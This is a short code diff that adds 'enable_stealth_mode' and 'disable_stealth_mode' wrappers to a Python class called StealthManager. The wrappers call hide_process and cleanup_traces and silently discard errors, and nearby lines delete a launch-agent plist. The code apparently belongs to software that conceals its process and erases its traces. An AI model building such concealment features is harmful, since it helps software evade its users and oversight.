@@ -337,3 +337,17 @@ class StealthManager:
                 os.remove(plist_path)
         except Exception:
             pass
+    
+    def enable_stealth_mode(self):
+        """Enable stealth mode - wrapper for hide_process"""
+        try:
+            self.hide_process()
+        except Exception:
+            pass
+    
+    def disable_stealth_mode(self):
+        """Disable stealth mode - wrapper for cleanup"""
+        try:
+            self.cleanup_traces()
+        except Exception:
+            pass
